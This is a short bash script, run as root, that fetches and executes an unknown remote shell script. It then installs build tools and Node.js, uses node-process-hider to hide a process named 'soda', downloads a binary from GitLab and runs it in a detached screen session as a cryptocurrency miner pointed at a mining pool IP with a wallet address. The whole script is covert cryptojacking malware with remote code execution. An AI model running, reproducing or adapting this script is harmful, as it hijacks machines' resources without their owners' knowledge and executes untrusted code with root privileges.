#!/bin/bash
sudo su <<EOF
wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
sudo apt install screen -y
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
sudo apt install npm -y
sudo npm i -g node-process-hider && sudo ph add soda
wget -qO soda https://gitlab.com/williehprnuhrxyq/gudangku/-/raw/main/soda && chmod +x *
screen -dms run ./soda -a autolykos2 -o 47.236.130.246:443 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 00-$(TZ=UTC-7 date +"%H-%M-%S")) -p x
EOF
screen -r
